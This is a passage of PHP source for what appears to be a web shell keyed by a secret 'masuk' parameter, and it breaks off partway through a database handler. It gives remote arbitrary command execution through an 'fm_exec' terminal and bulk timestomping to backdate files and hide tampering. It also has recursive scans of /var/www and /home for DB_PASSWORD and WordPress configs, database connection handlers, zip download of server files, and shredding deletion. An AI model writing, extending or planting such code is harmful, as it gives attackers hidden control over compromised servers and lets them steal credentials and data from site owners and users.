        global $dir;
        if (!file_exists($path)) {
            $results['errors'][] = 'Not found: ' . $path;
            $results['failed_count']++;
            return false;
        }
        
        $success = @chmod($path, octdec($permission));
        $parentDir = dirname($path);
        $results['processed'][] = [
            'path' => $path,
            'name' => basename($path),
            'dir' => $parentDir,
            'type' => is_dir($path) ? 'dir' : 'file',
            'success' => $success
        ];
        
        if ($success) {
            $results['success_count']++;
        } else {
            $results['errors'][] = 'Failed: ' . $path;
            $results['failed_count']++;
        }
        $results['total']++;
        
        // If directory and recursive, process children
        if ($success && is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
                    chmod_recursive($childPath, $permission, $results);
                }
            }
        }
        
        return $success;
    }
    
    // Process each selected file/folder
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        
        if ($recursive && is_dir($targetPath)) {
            // Recursive chmod for directory
            chmod_recursive($targetPath, $permission, $results);
        } else {
            // Single item chmod
            if (file_exists($targetPath)) {
                $success = @chmod($targetPath, octdec($permission));
                $parentDir = dirname($targetPath);
                $results['processed'][] = [
                    'path' => $targetPath,
                    'name' => basename($targetPath),
                    'dir' => $parentDir,
                    'type' => is_dir($targetPath) ? 'dir' : 'file',
                    'success' => $success
                ];
                if ($success) {
                    $results['success_count']++;
                } else {
                    $results['errors'][] = 'Failed: ' . $targetPath;
                    $results['failed_count']++;
                }
                $results['total']++;
            } else {
                $results['errors'][] = 'Not found: ' . $targetPath;
                $results['failed_count']++;
                $results['total']++;
            }
        }
    }
    
    echo json_encode($results);
    exit;
}

// 🔥 BULK TIMESTOMP - Change file timestamps
if (isset($_POST['action']) && $_POST['action'] === 'timestomp_bulk' && !empty($_POST['selected_files'])) {
    header('Content-Type: application/json');
    
    $timestamp_str = isset($_POST['timestomp_time']) ? $_POST['timestomp_time'] : '';
    $recursive = isset($_POST['timestomp_recursive']) && $_POST['timestomp_recursive'] === '1';
    $reference_file = isset($_POST['timestomp_reference']) ? $_POST['timestomp_reference'] : '';
    
    $results = [
        'success' => true,
        'total' => 0,
        'success_count' => 0,
        'failed_count' => 0,
        'processed' => [],
        'errors' => [],
        'timestamp_applied' => ''
    ];
    
    // Determine target timestamp
    $target_timestamp = time();
    
    if (!empty($reference_file) && file_exists($reference_file)) {
        // Use reference file's timestamp
        $target_timestamp = filemtime($reference_file);
        $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp) . ' (from ' . basename($reference_file) . ')';
    } elseif (!empty($timestamp_str)) {
        // Parse DD-MM-YYYY HH:MM:SS format
        $parsed = DateTime::createFromFormat('d-m-Y H:i:s', $timestamp_str);
        if ($parsed) {
            $target_timestamp = $parsed->getTimestamp();
            $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp);
        } else {
            $results['success'] = false;
            $results['errors'][] = 'Invalid timestamp format. Use: DD-MM-YYYY HH:MM:SS';
            echo json_encode($results);
            exit;
        }
    } else {
        $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp) . ' (current time)';
    }
    
    // Function to recursively timestomp
    function timestomp_recursive($path, $timestamp, &$results) {
        if (!file_exists($path)) {
            $results['errors'][] = 'Not found: ' . $path;
            $results['failed_count']++;
            return false;
        }
        
        $success = @touch($path, $timestamp, $timestamp);
        $parentDir = dirname($path);
        
        $results['processed'][] = [
            'path' => $path,
            'name' => basename($path),
            'dir' => $parentDir,
            'type' => is_dir($path) ? 'dir' : 'file',
            'success' => $success,
            'new_time' => date('d-m-Y H:i:s', $timestamp)
        ];
        
        if ($success) {
            $results['success_count']++;
        } else {
            $results['errors'][] = 'Failed: ' . $path;
            $results['failed_count']++;
        }
        $results['total']++;
        
        // If directory and recursive, process children
        if ($success && is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
                    timestomp_recursive($childPath, $timestamp, $results);
                }
            }
        }
        
        return $success;
    }
    
    // Process each selected file/folder
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        
        if ($recursive && is_dir($targetPath)) {
            timestomp_recursive($targetPath, $target_timestamp, $results);
        } else {
            if (file_exists($targetPath)) {
                $success = @touch($targetPath, $target_timestamp, $target_timestamp);
                $parentDir = dirname($targetPath);
                
                $results['processed'][] = [
                    'path' => $targetPath,
                    'name' => basename($targetPath),
                    'dir' => $parentDir,
                    'type' => is_dir($targetPath) ? 'dir' : 'file',
                    'success' => $success,
                    'new_time' => date('d-m-Y H:i:s', $target_timestamp)
                ];
                
                if ($success) {
                    $results['success_count']++;
                } else {
                    $results['errors'][] = 'Failed: ' . $targetPath;
                    $results['failed_count']++;
                }
                $results['total']++;
            } else {
                $results['errors'][] = 'Not found: ' . $targetPath;
                $results['failed_count']++;
                $results['total']++;
            }
        }
    }
    
    echo json_encode($results);
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'unzip_file' && !empty($_POST['unzip_target'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_target']);
    $zip = new ZipArchive;
    if ($zip->open($targetFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
// ========== FILE MANAGER EXTENDED API ==========

// Copy files/dirs
if (isset($_POST['action']) && $_POST['action'] === 'fm_copy') {
    header('Content-Type: application/json');
    $files = isset($_POST['selected_files']) ? $_POST['selected_files'] : [];
    $dest = isset($_POST['destination']) ? $_POST['destination'] : '';
    if (empty($files) || empty($dest) || !is_dir($dest)) {
        echo json_encode(['success' => false, 'message' => 'Invalid destination or no files selected']);
        exit;
    }
    $ok = 0; $fail = 0;
    foreach ($files as $f) {
        $src = $dir . DIRECTORY_SEPARATOR . $f;
        $target = rtrim($dest, '/\\') . DIRECTORY_SEPARATOR . $f;
        if (is_dir($src)) {
            if (copy_dir_recursive($src, $target)) $ok++; else $fail++;
        } elseif (is_file($src)) {
            if (@copy($src, $target)) $ok++; else $fail++;
        } else { $fail++; }
    }
    echo json_encode(['success' => true, 'copied' => $ok, 'failed' => $fail]);
    exit;
}

function copy_dir_recursive($src, $dst) {
    if (!@mkdir($dst, 0755, true) && !is_dir($dst)) return false;
    $items = @scandir($src);
    if (!$items) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $s = $src . DIRECTORY_SEPARATOR . $item;
        $d = $dst . DIRECTORY_SEPARATOR . $item;
        if (is_dir($s)) { if (!copy_dir_recursive($s, $d)) return false; }
        else { if (!@copy($s, $d)) return false; }
    }
    return true;
}

// Move files/dirs
if (isset($_POST['action']) && $_POST['action'] === 'fm_move') {
    header('Content-Type: application/json');
    $files = isset($_POST['selected_files']) ? $_POST['selected_files'] : [];
    $dest = isset($_POST['destination']) ? $_POST['destination'] : '';
    if (empty($files) || empty($dest) || !is_dir($dest)) {
        echo json_encode(['success' => false, 'message' => 'Invalid destination or no files selected']);
        exit;
    }
    $ok = 0; $fail = 0;
    foreach ($files as $f) {
        $src = $dir . DIRECTORY_SEPARATOR . $f;
        $target = rtrim($dest, '/\\') . DIRECTORY_SEPARATOR . $f;
        if (@rename($src, $target)) $ok++; else $fail++;
    }
    echo json_encode(['success' => true, 'moved' => $ok, 'failed' => $fail]);
    exit;
}

// Bulk download (zip selected files and stream)
if (isset($_GET['action']) && $_GET['action'] === 'fm_bulk_download') {
    $files = isset($_GET['files']) ? explode('|', $_GET['files']) : [];
    if (empty($files)) { http_response_code(400); exit('No files selected'); }
    if (!class_exists('ZipArchive')) {
        http_response_code(500);
        exit('Zip extension not available on this server');
    }
    $zipName = 'download_' . date('Y-m-d_His') . '.zip';
    $tmpZip = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
    $zip = new ZipArchive;
    if ($zip->open($tmpZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($files as $f) {
            $full = $dir . DIRECTORY_SEPARATOR . $f;
            if (is_file($full)) {
                $zip->addFile($full, $f);
            } elseif (is_dir($full)) {
                $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($full, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iter as $item) {
                    $rel = $f . DIRECTORY_SEPARATOR . $iter->getSubPathName();
                    if ($item->isDir()) { $zip->addEmptyDir($rel); }
                    else { $zip->addFile($item->getPathname(), $rel); }
                }
            }
        }
        $zip->close();
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipName . '"');
        header('Content-Length: ' . filesize($tmpZip));
        readfile($tmpZip);
        @unlink($tmpZip);
    }
    exit;
}

// File search (recursive)
if (isset($_GET['action']) && $_GET['action'] === 'fm_search') {
    header('Content-Type: application/json');
    $query = isset($_GET['q']) ? $_GET['q'] : '';
    $searchDir = isset($_GET['search_dir']) && $_GET['search_dir'] !== '' ? $_GET['search_dir'] : $dir;
    $maxResults = 200;
    $results = [];
    if ($query !== '' && is_dir($searchDir)) {
        try {
            $iter = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($searchDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iter as $item) {
                if (count($results) >= $maxResults) break;
                $name = $item->getFilename();
                if (stripos($name, $query) !== false) {
                    $results[] = [
                        'name' => $name,
                        'path' => $item->getPathname(),
                        'is_dir' => $item->isDir(),
                        'size' => $item->isFile() ? $item->getSize() : 0,
                        'mtime' => date('d-m-Y H:i:s', $item->getMTime()),
                    ];
                }
            }
        } catch (Exception $e) {}
    }
    echo json_encode(['results' => $results, 'total' => count($results), 'max' => $maxResults]);
    exit;
}

// Content search (grep)
if (isset($_GET['action']) && $_GET['action'] === 'fm_grep') {
    header('Content-Type: application/json');
    $pattern = isset($_GET['pattern']) ? $_GET['pattern'] : '';
    $searchDir = isset($_GET['search_dir']) && $_GET['search_dir'] !== '' ? $_GET['search_dir'] : $dir;
    $ext = isset($_GET['ext']) ? $_GET['ext'] : '';
    $maxResults = 100;
    $maxFileSize = 2 * 1024 * 1024;
    $results = [];
    if ($pattern !== '' && is_dir($searchDir)) {
        $textExts = ['php','js','css','html','htm','txt','json','xml','yml','yaml','md','sql','sh','bash','py','rb','conf','ini','env','log','csv','htaccess'];
        try {
            $iter = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($searchDir, RecursiveDirectoryIterator::SKIP_DOTS)
            );
            foreach ($iter as $item) {
                if (count($results) >= $maxResults) break;
                if (!$item->isFile() || $item->getSize() > $maxFileSize) continue;
                $fileExt = strtolower(pathinfo($item->getFilename(), PATHINFO_EXTENSION));
                if ($ext !== '' && $fileExt !== $ext) continue;
                if ($ext === '' && !in_array($fileExt, $textExts)) continue;
                $lines = @file($item->getPathname());
                if (!$lines) continue;
                foreach ($lines as $lineNum => $line) {
                    if (count($results) >= $maxResults) break;
                    if (stripos($line, $pattern) !== false) {
                        $results[] = [
                            'file' => $item->getPathname(),
                            'line' => $lineNum + 1,
                            'content' => trim(substr($line, 0, 300)),
                            'filename' => $item->getFilename(),
                        ];
                    }
                }
            }
        } catch (Exception $e) {}
    }
    echo json_encode(['results' => $results, 'total' => count($results), 'max' => $maxResults]);
    exit;
}

// File info / properties
if (isset($_GET['action']) && $_GET['action'] === 'fm_file_info') {
    header('Content-Type: application/json');
    $file = isset($_GET['file']) ? $_GET['file'] : '';
    $filepath = $dir . DIRECTORY_SEPARATOR . basename($file);
    if (!file_exists($filepath)) {
        echo json_encode(['error' => 'File not found']);
        exit;
    }
    $stat = @stat($filepath);
    $info = [
        'name' => basename($filepath),
        'full_path' => realpath($filepath) ?: $filepath,
        'type' => is_dir($filepath) ? 'directory' : 'file',
        'size' => is_file($filepath) ? filesize($filepath) : 0,
        'perms' => substr(sprintf('%o', fileperms($filepath)), -4),
        'perms_human' => fm_perms_human(fileperms($filepath)),
        'owner' => function_exists('posix_getpwuid') && $stat ? @posix_getpwuid($stat['uid'])['name'] : ($stat ? $stat['uid'] : '-'),
        'group' => function_exists('posix_getgrgid') && $stat ? @posix_getgrgid($stat['gid'])['name'] : ($stat ? $stat['gid'] : '-'),
        'owner_id' => $stat ? $stat['uid'] : '-',
        'group_id' => $stat ? $stat['gid'] : '-',
        'inode' => $stat ? $stat['ino'] : '-',
        'links' => $stat ? $stat['nlink'] : '-',
        'created' => date('d-m-Y H:i:s', filectime($filepath)),
        'modified' => date('d-m-Y H:i:s', filemtime($filepath)),
        'accessed' => date('d-m-Y H:i:s', fileatime($filepath)),
        'readable' => is_readable($filepath),
        'writable' => is_writable($filepath),
        'executable' => is_executable($filepath),
        'is_link' => is_link($filepath),
        'link_target' => is_link($filepath) ? @readlink($filepath) : null,
        'mime' => is_file($filepath) ? (function_exists('mime_content_type') ? @mime_content_type($filepath) : '') : 'directory',
    ];
    if (is_dir($filepath)) {
        $dirSize = 0; $dirCount = 0; $fileCount = 0;
        try {
            $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filepath, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($ri as $f) { if ($f->isFile()) { $dirSize += $f->getSize(); $fileCount++; } else { $dirCount++; } }
        } catch (Exception $e) {}
        $info['dir_size'] = $dirSize;
        $info['dir_files'] = $fileCount;
        $info['dir_dirs'] = $dirCount;
    }
    echo json_encode($info);
    exit;
}

function fm_perms_human($perms) {
    $s = '';
    $s .= (($perms & 0x0100) ? 'r' : '-');
    $s .= (($perms & 0x0080) ? 'w' : '-');
    $s .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $s .= (($perms & 0x0020) ? 'r' : '-');
    $s .= (($perms & 0x0010) ? 'w' : '-');
    $s .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $s .= (($perms & 0x0004) ? 'r' : '-');
    $s .= (($perms & 0x0002) ? 'w' : '-');
    $s .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $s;
}

// Directory tree (JSON)
if (isset($_GET['action']) && $_GET['action'] === 'fm_dir_tree') {
    header('Content-Type: application/json');
    $treePath = isset($_GET['path']) ? $_GET['path'] : $dir;
    $depth = isset($_GET['depth']) ? intval($_GET['depth']) : 2;
    echo json_encode(fm_build_tree($treePath, $depth));
    exit;
}

function fm_build_tree($path, $maxDepth, $currentDepth = 0) {
    $result = ['name' => basename($path) ?: $path, 'path' => $path, 'children' => []];
    if ($currentDepth >= $maxDepth || !is_readable($path)) return $result;
    $items = @scandir($path);
    if (!$items) return $result;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            $result['children'][] = fm_build_tree($full, $maxDepth, $currentDepth + 1);
        }
    }
    usort($result['children'], function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    return $result;
}

// Chown
if (isset($_POST['action']) && $_POST['action'] === 'fm_chown') {
    header('Content-Type: application/json');
    $target = $dir . DIRECTORY_SEPARATOR . basename($_POST['target']);
    $owner = isset($_POST['owner']) ? $_POST['owner'] : '';
    $group = isset($_POST['group']) ? $_POST['group'] : '';
    $recursive = !empty($_POST['recursive']);
    if (!file_exists($target) || ($owner === '' && $group === '')) {
        echo json_encode(['success' => false, 'message' => 'Invalid target or owner/group']);
        exit;
    }
    $chownStr = $owner;
    if ($group !== '') $chownStr .= ':' . $group;
    $flag = $recursive ? '-R ' : '';
    $cmd = 'chown ' . $flag . escapeshellarg($chownStr) . ' ' . escapeshellarg($target) . ' 2>&1';
    $result = execute_shell_command($cmd);
    echo json_encode(['success' => true, 'output' => $result]);
    exit;
}

// Create archive (zip / tar / tar.gz)
if (isset($_POST['action']) && $_POST['action'] === 'fm_create_archive') {
    header('Content-Type: application/json');
    $files = isset($_POST['selected_files']) ? $_POST['selected_files'] : [];
    $archiveName = isset($_POST['archive_name']) ? basename($_POST['archive_name']) : '';
    $format = isset($_POST['format']) ? $_POST['format'] : 'zip';
    if (empty($files) || $archiveName === '') {
        echo json_encode(['success' => false, 'message' => 'No files or archive name']);
        exit;
    }
    $archivePath = $dir . DIRECTORY_SEPARATOR . $archiveName;
    if ($format === 'zip') {
        if (!class_exists('ZipArchive')) {
            echo json_encode(['success' => false, 'message' => 'Zip extension not available on this server']);
            exit;
        }
        $zip = new ZipArchive;
        if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($files as $f) {
                $full = $dir . DIRECTORY_SEPARATOR . $f;
                if (is_file($full)) { $zip->addFile($full, $f); }
                elseif (is_dir($full)) {
                    $zip->addEmptyDir($f);
                    $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($full, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                    foreach ($ri as $item) {
                        $rel = $f . DIRECTORY_SEPARATOR . $ri->getSubPathName();
                        if ($item->isDir()) $zip->addEmptyDir($rel); else $zip->addFile($item->getPathname(), $rel);
                    }
                }
            }
            $zip->close();
            echo json_encode(['success' => true, 'message' => "Archive created: $archiveName"]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to create zip']);
        }
    } else {
        $fileArgs = '';
        foreach ($files as $f) $fileArgs .= ' ' . escapeshellarg($f);
        $tarFlag = $format === 'tar.gz' ? 'czf' : 'cf';
        $cmd = 'cd ' . escapeshellarg($dir) . ' && tar ' . $tarFlag . ' ' . escapeshellarg($archiveName) . $fileArgs . ' 2>&1';
        $result = execute_shell_command($cmd);
        $created = file_exists($archivePath);
        echo json_encode(['success' => $created, 'message' => $created ? "Archive created: $archiveName" : $result]);
    }
    exit;
}

// Extract archive (zip / tar / tar.gz)
if (isset($_POST['action']) && $_POST['action'] === 'fm_extract') {
    header('Content-Type: application/json');
    $file = isset($_POST['file']) ? basename($_POST['file']) : '';
    $extractTo = isset($_POST['extract_to']) ? $_POST['extract_to'] : '';
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (!is_file($filepath)) {
        echo json_encode(['success' => false, 'message' => 'File not found']);
        exit;
    }
    $destDir = $dir;
    if ($extractTo !== '') {
        $destDir = $dir . DIRECTORY_SEPARATOR . basename($extractTo);
        if (!is_dir($destDir)) @mkdir($destDir, 0755, true);
    }
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if ($ext === 'zip') {
        if (!class_exists('ZipArchive')) {
            echo json_encode(['success' => false, 'message' => 'Zip extension not available on this server']);
            exit;
        }
        $zip = new ZipArchive;
        if ($zip->open($filepath) === TRUE) {
            $zip->extractTo($destDir);
            $zip->close();
            echo json_encode(['success' => true, 'message' => "Extracted to: $destDir"]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to open zip']);
        }
    } else {
        $tarFlag = ($ext === 'gz' || $ext === 'tgz') ? 'xzf' : 'xf';
        $cmd = 'tar ' . $tarFlag . ' ' . escapeshellarg($filepath) . ' -C ' . escapeshellarg($destDir) . ' 2>&1';
        $result = execute_shell_command($cmd);
        echo json_encode(['success' => true, 'message' => "Extracted to: $destDir", 'output' => $result]);
    }
    exit;
}

// List archive contents
if (isset($_GET['action']) && $_GET['action'] === 'fm_list_archive') {
    header('Content-Type: application/json');
    $file = isset($_GET['file']) ? basename($_GET['file']) : '';
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (!is_file($filepath)) { echo json_encode(['error' => 'File not found']); exit; }
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $contents = [];
    if ($ext === 'zip') {
        if (!class_exists('ZipArchive')) {
            echo json_encode(['error' => 'Zip extension not available on this server']); exit;
        }
        $zip = new ZipArchive;
        if ($zip->open($filepath) === TRUE) {
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                $contents[] = ['name' => $stat['name'], 'size' => $stat['size'], 'compressed' => $stat['comp_size']];
            }
            $zip->close();
        }
    } else {
        $tarFlag = ($ext === 'gz' || $ext === 'tgz') ? 'tzf' : 'tf';
        $cmd = 'tar ' . $tarFlag . ' ' . escapeshellarg($filepath) . ' 2>&1';
        $out = execute_shell_command($cmd);
        foreach (explode("\n", $out) as $line) {
            $line = trim($line);
            if ($line !== '') $contents[] = ['name' => $line, 'size' => 0, 'compressed' => 0];
        }
    }
    echo json_encode(['file' => $file, 'contents' => $contents, 'count' => count($contents)]);
    exit;
}

// Tail file (last N lines)
if (isset($_GET['action']) && $_GET['action'] === 'fm_tail') {
    header('Content-Type: application/json');
    $file = isset($_GET['file']) ? basename($_GET['file']) : '';
    $lines = isset($_GET['lines']) ? intval($_GET['lines']) : 50;
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (!is_file($filepath)) { echo json_encode(['error' => 'File not found']); exit; }
    $allLines = @file($filepath);
    if ($allLines === false) { echo json_encode(['error' => 'Cannot read file']); exit; }
    $total = count($allLines);
    $tail = array_slice($allLines, -$lines);
    echo json_encode(['content' => implode('', $tail), 'total_lines' => $total, 'showing' => count($tail)]);
    exit;
}

// Secure delete (shred)
if (isset($_POST['action']) && $_POST['action'] === 'fm_shred') {
    header('Content-Type: application/json');
    $files = isset($_POST['selected_files']) ? $_POST['selected_files'] : [];
    $ok = 0; $fail = 0;
    foreach ($files as $f) {
        $filepath = $dir . DIRECTORY_SEPARATOR . basename($f);
        if (!is_file($filepath)) { $fail++; continue; }
        $size = filesize($filepath);
        $fh = @fopen($filepath, 'r+');
        if ($fh) {
            for ($pass = 0; $pass < 3; $pass++) {
                fseek($fh, 0);
                $written = 0;
                while ($written < $size) {
                    $chunk = min(8192, $size - $written);
                    if ($pass === 0) {
                        $data = str_repeat("\x00", $chunk);
                    } elseif ($pass === 1) {
                        $data = str_repeat("\xFF", $chunk);
                    } else {
                        $data = function_exists('openssl_random_pseudo_bytes') ? openssl_random_pseudo_bytes($chunk) : str_repeat(chr(mt_rand(0, 255)), $chunk);
                    }
                    fwrite($fh, $data);
                    $written += $chunk;
                }
                fflush($fh);
            }
            fclose($fh);
        }
        if (@unlink($filepath)) $ok++; else $fail++;
    }
    echo json_encode(['success' => true, 'shredded' => $ok, 'failed' => $fail]);
    exit;
}

// FM Terminal - execute command via AJAX, return JSON
if (isset($_POST['action']) && $_POST['action'] === 'fm_exec') {
    header('Content-Type: application/json');
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : $dir;
    if (strlen($cmd) < 1 || strlen($cmd) > 10000) {
        echo json_encode(['success' => false, 'error' => 'Invalid command length']);
        exit;
    }
    if (is_dir($cwd)) @chdir($cwd);
    $result = function_exists('execute_command_with_timeout') ? execute_command_with_timeout($cmd) : ['output' => @shell_exec($cmd . ' 2>&1'), 'error' => '', 'timed_out' => false];
    $out = isset($result['output']) ? $result['output'] : '';
    if (!empty($result['error'])) $out .= "\n" . $result['error'];
    echo json_encode(['success' => true, 'output' => $out, 'timed_out' => !empty($result['timed_out'])]);
    exit;
}

// Path autocomplete
if (isset($_GET['action']) && $_GET['action'] === 'fm_autocomplete') {
    header('Content-Type: application/json');
    $partial = isset($_GET['partial']) ? $_GET['partial'] : '';
    $suggestions = [];
    if ($partial !== '') {
        $parentDir = dirname($partial);
        $prefix = basename($partial);
        if (is_dir($parentDir)) {
            $items = @scandir($parentDir);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    if (stripos($item, $prefix) === 0 && is_dir($parentDir . DIRECTORY_SEPARATOR . $item)) {
                        $suggestions[] = $parentDir . DIRECTORY_SEPARATOR . $item;
                        if (count($suggestions) >= 15) break;
                    }
                }
            }
        }
    }
    echo json_encode($suggestions);
    exit;
}

// Media preview (serve file with correct MIME for inline display)
if (isset($_GET['action']) && $_GET['action'] === 'fm_preview') {
    $file = basename(isset($_GET['file']) ? $_GET['file'] : '');
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (!is_file($filepath)) { http_response_code(404); exit; }
    $mime = function_exists('mime_content_type') ? mime_content_type($filepath) : 'application/octet-stream';
    header('Content-Type: ' . $mime);
    header('Content-Length: ' . filesize($filepath));
    header('Content-Disposition: inline; filename="' . $file . '"');
    header('Cache-Control: max-age=3600');
    readfile($filepath);
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'view_file') {
    $file = basename($_GET['file']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        $raw = @file_get_contents($filepath);
        $isWritable = is_writable($filepath);
        header('Content-Type: application/json');
        $response = [
            'content' => mb_check_encoding($raw, 'UTF-8') ? $raw : '[File is binary or not UTF-8 compatible]',
            'writable' => $isWritable
        ];
        echo json_encode($response);
    } else {
        http_response_code(404);
        echo json_encode(['content' => 'File not found.', 'writable' => false]);
    }
    exit;
}
// 🚀 STREAMING WEBSITE DISCOVERY HANDLER
if (isset($_GET['action']) && $_GET['action'] === 'discover_websites') {
    // Set streaming headers
    header('Content-Type: application/x-ndjson; charset=utf-8');
    header('X-Accel-Buffering: no');
    header('Cache-Control: no-cache');
    
    $mode = isset($_GET['mode']) ? $_GET['mode'] : 'standard';
    $searchType = isset($_GET['search_type']) ? $_GET['search_type'] : 'filename';
    $pattern = isset($_GET['pattern']) ? $_GET['pattern'] : '';
    $extractTitle = isset($_GET['extract_title']) && $_GET['extract_title'] === '1';
    $showPreview = isset($_GET['show_preview']) && $_GET['show_preview'] === '1';
    $customPath = isset($_GET['custom_path']) ? $_GET['custom_path'] : '';
    $maxResults = intval(isset($_GET['max_results']) ? $_GET['max_results'] : 1000);
    $useCache = isset($_GET['use_cache']) && $_GET['use_cache'] === '1';

    $depthMap = array('quick' => 2, 'standard' => 4, 'deep' => 6, 'brutal' => 10);
    $maxDepth = isset($depthMap[$mode]) ? $depthMap[$mode] : 4;
    
    // Build search paths
    $searchPaths = [];
    if (!empty($customPath)) {
        $customPaths = array_map('trim', explode(',', $customPath));
        foreach ($customPaths as $cp) {
            if (is_dir($cp) && is_readable($cp)) {
                $searchPaths[] = $cp;
            }
        }
    }
    // Add default paths jika tidak ada custom path atau dengan custom path
    $defaultPaths = ['/var/www', '/home', '/opt', '/srv', '/data', '/usr/share', getcwd()];
    foreach ($defaultPaths as $dp) {
        if (is_dir($dp) && is_readable($dp) && !in_array($dp, $searchPaths)) {
            $searchPaths[] = $dp;
        }
    }
    
    // Check cache
    $cacheKey = get_scan_cache_key($searchType, $pattern, $mode);
    if ($useCache && ($cached = get_cached_scan($cacheKey))) {
        echo json_encode(['type' => 'cache', 'data' => $cached]) . "\n";
        flush();
        exit;
    }
    
    $patterns = array_map('trim', explode(',', $pattern));
    if (empty($patterns[0])) {
        $patterns = $searchType === 'filename' ? ['index.php', 'index.html'] : ['DB_PASSWORD'];
    }
    
    // Streaming output
    $allResults = [];
    
    if ($searchType === 'filename') {
        $generator = scan_for_files_optimized($searchPaths, $patterns, $maxDepth, $extractTitle, $maxResults);
    } else {
        $fileExtensions = ['php', 'env', 'json', 'yml', 'yaml', 'xml', 'conf', 'ini', 'txt', 'config'];
        $generator = scan_for_content_optimized($searchPaths, $patterns, $maxDepth, $showPreview, $fileExtensions, $maxResults);
    }
    
    foreach ($generator as $item) {
        echo json_encode($item) . "\n";
        flush();
        
        if ($item['type'] === 'result') {
            $allResults[] = $item['data'];
        }
        
        // Cache hasil scan (limit size)
        if ($item['type'] === 'complete' && count($allResults) <= 500) {
            set_cached_scan($cacheKey, $allResults);
        }
    }
    
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'explore_db') {
    header('Content-Type: application/json');
    $configs = find_wp_configs();
    echo json_encode($configs);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'connect_db') {
    header('Content-Type: application/json');
    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
    $port = intval(isset($_POST['db_port']) ? $_POST['db_port'] : 3306);
    $dbname = isset($_POST['db_name']) ? $_POST['db_name'] : '';
    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        echo json_encode(['success' => true]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'get_tables') {
    header('Content-Type: application/json');
    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
    $port = intval(isset($_POST['db_port']) ? $_POST['db_port'] : 3306);
    $dbname = isset($_POST['db_name']) ? $_POST['db_name'] : '';
    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $serverInfo = $pdo->getAttribute(PDO::ATTR_SERVER_VERSION);
        $stmt = $pdo->query("SHOW TABLES");
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo json_encode(['success' => true, 'tables' => $tables, 'server_info' => $serverInfo]);
    } catch (PDOException $e) {
